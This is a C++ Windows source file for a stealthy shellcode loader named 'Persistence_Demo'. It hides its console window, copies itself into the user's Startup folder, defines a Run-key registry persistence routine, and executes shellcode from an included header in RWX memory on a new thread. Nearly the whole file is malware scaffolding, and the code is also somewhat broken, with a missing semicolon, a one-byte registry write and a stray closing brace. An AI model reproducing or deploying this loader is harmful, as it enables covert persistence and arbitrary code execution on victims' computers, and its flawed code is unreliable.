#include <Windows.h>
#include <iostream>
#include <tchar.h>
#include <stdio.h>
#include <strsafe.h>
#include <fstream>
#include <memory>
#include <filesystem>
#include <shlobj.h>
#include "shellcode.h"
#include "resource.h"

#pragma comment(lib, "ntdll")
#define MAX_THREADS 3

using namespace std;
using myNtTestAlert = NTSTATUS(NTAPI*)();

void Reg() {
	::HKEY Handle_Key = 0;
	::DWORD Dispoition = 0;

	::RegOpenKeyEx( HKEY_LOCAL_MACHINE,
					"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
					0,
					KEY_ALL_ACCESS,
					&Handle_Key );
	const unsigned char Path[ MAX_PATH ] = "C:\\Windows\\Persistence_Demo.exe"
	::RegSetValueEx( Handle_Key, "!!!", 0, 1, Path, sizeof( unsigned char ) );
};


bool copy_file(const char* From, const char* To, std::size_t MaxBufferSize = 1048576)
{
	std::ifstream is(From, std::ios_base::binary);
	std::ofstream os(To, std::ios_base::binary);

	std::pair<char*, std::ptrdiff_t> buffer;
	buffer = std::get_temporary_buffer<char>(MaxBufferSize);

	while (is.good() and os)
	{
		is.read(buffer.first, buffer.second);
		os.write(buffer.first, is.gcount());
	}

	std::return_temporary_buffer(buffer.first);

	if (os.fail()) return false;
	if (is.eof()) return true;
	return false;
}

int Hide() {
	WCHAR startupFolderPath[MAX_PATH];
	if (SUCCEEDED(SHGetFolderPath(NULL, CSIDL_STARTUP, NULL, 0, startupFolderPath))) {
		std::wstring startupPath = std::wstring(startupFolderPath) + L"\\Persistence_Demo.exe";
		int bufferSize = WideCharToMultiByte(CP_UTF8, 0, startupPath.c_str(), -1, NULL, 0, NULL, NULL);
		std::string narrowStartupPath(bufferSize, 0);
		WideCharToMultiByte(CP_UTF8, 0, startupPath.c_str(), -1, &narrowStartupPath[0], bufferSize, NULL, NULL);
		bool copy_result = copy_file("Persistence_Demo.exe", narrowStartupPath.c_str());
		return copy_result;
	}
	else {
		return 0;
	}
}

void Stealth()
{
	HWND Stealth;
	AllocConsole();
	Stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(Stealth, 0);
}

int main(int argc, char* argv[])
{
    Stealth(); 
	Hide();
	myNtTestAlert testAlert = (myNtTestAlert)(GetProcAddress(GetModuleHandleA("ntdll"), "NtTestAlert"));
	if (testAlert == NULL) {
		std::cout << "[*] something went very wrong lol" << std::endl;
		return 0;
	}

	SIZE_T shellSize = sizeof(shellcode);
	LPVOID shellAddr = VirtualAlloc(NULL, shellSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	if (shellAddr == NULL) {
		std::cout << "[*] memory couldn't be allocated. " << std::endl;
		return 0;
	}
	memcpy(shellAddr, shellcode, shellSize);
	HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)shellAddr, NULL, 0, NULL);
	if (hThread == NULL) {
		std::cout << "[*] thread couldn't be created. " << std::endl;
		return 0;
	}

	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);
	VirtualFree(shellAddr, 0, MEM_RELEASE);

	testAlert();
	return 0;
}
}